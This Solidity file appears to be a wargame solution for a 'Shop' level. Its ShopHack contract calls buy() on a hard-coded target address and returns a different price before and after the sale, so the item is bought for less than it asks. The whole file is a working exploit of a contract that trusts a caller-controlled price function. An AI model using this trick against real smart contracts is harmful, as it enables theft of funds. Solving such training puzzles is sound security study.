// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel21.sol";

contract ShopHack {
    Shop level21 = Shop(0x3892f142adD21aC46C6e891529A3Ee8E90fc64d9);

    function exploit() external {
        level21.buy();
    }

    function price() external view returns (uint) {
        return !level21.isSold() ? 101 : 1;
    }
}
